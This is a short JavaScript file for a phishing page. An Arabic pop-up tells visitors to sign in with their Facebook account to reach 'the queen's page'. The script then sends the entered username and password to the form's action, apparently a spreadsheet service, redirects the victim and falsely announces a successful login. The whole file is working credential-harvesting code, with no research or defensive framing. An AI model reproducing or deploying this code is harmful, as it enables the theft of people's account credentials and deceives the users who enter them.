let password = document.getElementById('password')
let username = document.getElementById('username')
let form = document.getElementById('sheetdb-form')

window.onload = function () {
  alert("قم بتسجيل الدخول بحساب فيسبوك لتتمكن من الدخول لصفحة الملكة");
}
form.addEventListener('submit', (e) => {
  console.log("askljdklas");
  e.preventDefault()
  fetch(form.action, {
    method: 'POST',
    body: new FormData(document.getElementById('sheetdb-form')),
  }).then((res) => {
location.href = './indexss.html';
alert("تم تسجيل الدخول");
  })
})